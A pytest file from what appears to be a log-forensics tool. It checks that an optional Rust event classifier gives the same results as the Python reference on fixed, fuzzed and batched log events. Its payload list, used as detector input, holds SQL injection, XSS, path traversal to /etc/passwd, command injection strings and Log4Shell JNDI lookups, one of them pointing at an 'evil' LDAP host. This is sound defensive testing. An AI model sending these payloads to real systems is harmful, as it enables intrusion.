"""
Parity tests for the optional Rust log classifier (forensis_core.classify_events) against the
Python reference (log_analyzer._classify_event). The Rust half is skipped when the extension isn't built.
"""
import json
import random

import pytest

from forensis.analyzers import log_analyzer as la
from tests.test_pcap_engine import _assert_identical

needs_native = pytest.mark.skipif(la._native_classify_events is None, reason="forensis_core extension not built")

PATTERNS = [r["regex"].pattern for r in la.PATTERN_RULES]


def _native(events):
    return la._native_classify_events(events, PATTERNS, la.AUTH_FAILURE_REGEX.pattern)


def _check_parity(events):
    ref = [la._classify_event(e) for e in events]
    if la._native_classify_events is not None:
        _assert_identical(ref, _native(events))
    return ref


PAYLOADS = [
    "GET /index.html", "UNION SELECT 1,2", "' or 1=1 --", "<script>alert(1)</script>", "%3Cscript%3E",
    "../../etc/passwd", "%2e%2e%2fetc/passwd", "; bash -c id", "$(whoami)", "chmod +x x.sh",
    "/shell.php?cmd=ls", "eval(base64_decode(", "Failed password for root", "invalid user admin",
    "sqlmap/1.5", "Nikto", "${jndi:ldap://x.y/a}", "${jndi%3Aldap%3A//x}", "login+failed", "a+b%2Bc",
    "café", "日本語", "\U0001F600", "İΣ ΣΑΣ", "KELVIN K",
    "%ff%fe", "%e2%82", "%e2%82%ac", "%", "%%41", "%4%41", "%zz", "%2", "100%", "+", "%C3%A9", "%c3",
]
STATUSES = [None, "", 200, 404, 403, 401, 500, "404", "0007", "abc", "٤٠٤", " 12 ", "1_000",
            "+5", True, False, 12.9, 10**30, "99999999999999999999", [], {}, "-1"]
SOURCES = [None, "", "10.0.0.1", 0, 1, 2001, "hôst", {"a": 1}, [1], "\udcff"]
KEYS = ["ip", "host", "src_ip", "source_ip", "client_ip", "message", "raw", "path", "request", "uri", "process", "user"]


def _random_event(rng):
    evt = {}
    for k in rng.sample(KEYS, rng.randint(0, len(KEYS))):
        if k in ("ip", "host", "src_ip", "source_ip", "client_ip"):
            evt[k] = rng.choice(SOURCES)
        else:
            n = rng.randint(0, 4)
            evt[k] = rng.choice([None, 7, 1.5, {"m": "x"}, " ".join(rng.choice(PAYLOADS) for _ in range(n))])
    if rng.random() < 0.7:
        evt["status"] = rng.choice(STATUSES)
    return evt


def test_fixed_events_parity():
    events = [
        {},
        {"message": None, "raw": None, "status": None},
        {"ip": "1.2.3.4", "path": "/a?x=%27+or+1%3D1", "status": "404", "raw": "GET /a"},
        {"host": "srv", "process": "sshd", "message": "Failed password for root from 1.1.1.1"},
        {"message": "x", "path": 0, "status": "", "user": {"n": 1}},
        {"src_ip": "", "client_ip": "9.9.9.9", "uri": "${jndi:ldap://evil/a}"},
        {"message": "İΣ ΣΑΣ ouσ %C3%89 café", "status": True},
        {"message": "lone \udcff surrogate", "ip": "\udcff"},
    ]
    ref = _check_parity(events)
    assert ref[2][:3] == ("1.2.3.4", 404, "/a?x=%27+or+1%3D1") and ref[2][4] == 0  # sql_injection via decoding
    assert ref[3][3] is True and ref[3][4] == 5  # credential_abuse
    assert ref[5][4] == 7  # log4shell_probe
    assert ref[0] == ("unknown", None, None, False, None)


def test_fuzz_parity():
    rng = random.Random(1234)
    events = [_random_event(rng) for _ in range(3000)]
    _check_parity(events)


def test_batches_and_order():
    # more than one native batch (4096) keeps the per-event order
    events = [{"ip": str(i), "message": "sqlmap" if i % 7 == 0 else "ok", "status": 400 + i % 3} for i in range(9000)]
    ref = _check_parity(events)
    assert [r[0] for r in ref] == [str(i) for i in range(9000)]


@needs_native
def test_native_rejects_non_dict_events():
    with pytest.raises(TypeError):
        _native([{"a": 1}, "not a dict"])


def test_analyze_logs_parity(monkeypatch):
    rng = random.Random(99)
    lines = []
    for i in range(400):
        ip = f"10.0.0.{i % 6}"
        lines.append(f'{ip} - - [10/Oct/2000:13:55:36 -0700] "GET {rng.choice(PAYLOADS)} HTTP/1.0" {rng.choice([200, 404, 403, 500])} 23')
    apache = "\n".join(lines)
    jsonl = "\n".join(json.dumps({"ip": f"10.0.0.{i % 3}", "message": rng.choice(PAYLOADS), "status": rng.choice([200, "404", None])}) for i in range(300))
    results = {}
    for name, text, log_type in [("apache", apache, "apache"), ("elastic", jsonl, "elastic"), ("generic", apache, "generic")]:
        with_engine = la.analyze_logs(text, log_type=log_type)
        monkeypatch.setattr(la, "_native_classify_events", None)
        pure = la.analyze_logs(text, log_type=log_type)
        monkeypatch.undo()
        _assert_identical(pure, with_engine, name)
        results[name] = pure
    assert results["apache"]["summary"]["anomaly_count"] > 0
